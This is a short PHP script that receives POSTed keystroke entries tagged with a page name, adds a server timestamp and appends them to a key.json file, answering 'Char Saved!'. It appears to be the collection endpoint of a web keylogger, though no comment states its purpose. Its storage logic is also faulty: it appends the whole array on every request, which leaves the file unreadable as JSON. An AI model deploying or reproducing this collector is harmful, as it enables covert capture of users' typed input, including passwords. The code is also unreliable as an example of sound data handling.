<?php
	
session_start();

if (!isset($_POST['key'])) {
    echo "Access Denied";
    exit();
}

$file = fopen("key.json", "a+");

if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
    $_SESSION['page'] = $_POST['page'];
    $data = array();
} else {
    $data = json_decode(file_get_contents("key.json"), true); // Load existing data from the file
}

$_POST['server_time'] = date('d-m-Y H:i:s');

$data[] = $_POST; // Add the new data entry to the array

fwrite($file, json_encode($data, JSON_PRETTY_PRINT) . "\n"); // Write the entire array as a JSON object to the file with JSON_PRETTY_PRINT option for formatting

fclose($file);

echo "Char Saved!";



?>